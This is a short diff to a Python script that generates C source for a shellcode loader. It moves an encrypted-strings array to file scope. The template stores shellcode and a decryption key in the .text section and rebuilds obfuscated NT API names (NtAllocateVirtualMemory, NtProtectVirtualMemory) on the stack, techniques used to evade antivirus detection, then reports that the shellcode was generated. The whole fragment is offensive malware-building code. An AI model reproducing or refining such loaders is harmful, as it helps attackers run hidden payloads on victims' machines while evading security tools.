@@ -98,7 +98,8 @@ typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
 
 __attribute__((section(".text"))) static unsigned char shellcode[] = {{ {shellcode_array} }};
 __attribute__((section(".text"))) static unsigned char key[] = {{ {key_array} }};
-
+__attribute__((section(".text"))) static unsigned char enc_strings[] = {{ {combined_array} }};
+    
 __attribute__((section(".text.start")))
 void _start() {{
     SIZE_T size = sizeof(shellcode);
@@ -109,7 +110,6 @@ void _start() {{
     char* ntallocatevirtualmemory  = (char*)&stackbuf[{offsets[1]}];
     char* ntprotectvirtualmemory   = (char*)&stackbuf[{offsets[2]}];
 
-    __attribute__((section(".text"))) static unsigned char enc_strings[] = {{ {combined_array} }};
     for (SIZE_T i = 0; i < sizeof(enc_strings); i++)
         stackbuf[i] = enc_strings[i];
 
@@ -191,4 +191,5 @@ void _start() {{
 
 if iterations > 1:
     print(f"[+] Shellcode generated: {output_bin}")
+
 
